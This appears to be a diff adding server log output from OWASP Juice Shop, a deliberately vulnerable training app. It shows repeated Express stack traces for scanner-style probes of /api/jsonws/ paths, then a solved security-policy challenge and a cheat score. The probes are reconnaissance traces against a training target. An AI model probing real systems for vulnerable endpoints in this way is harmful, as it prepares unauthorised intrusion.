+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+Error: Unexpected path: /api/jsonws/
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+Error: Unexpected path: /api/jsonws/index.jsp
+    at /juice-shop/build/routes/angular.js:42:18
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:187:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at /juice-shop/build/routes/verify.js:111:5
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+    at Function.process_params (/juice-shop/node_modules/express/lib/router/index.js:346:12)
+    at next (/juice-shop/node_modules/express/lib/router/index.js:280:10)
+    at logger (/juice-shop/node_modules/morgan/index.js:144:5)
+    at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)
+    at trim_prefix (/juice-shop/node_modules/express/lib/router/index.js:328:13)
+    at /juice-shop/node_modules/express/lib/router/index.js:286:9
+info: Solved 2-star securityPolicyChallenge (Security Policy)
+info: Cheat score for securityPolicyChallenge solved in 1min (expected ~4min) with hints allowed: 0.7029125
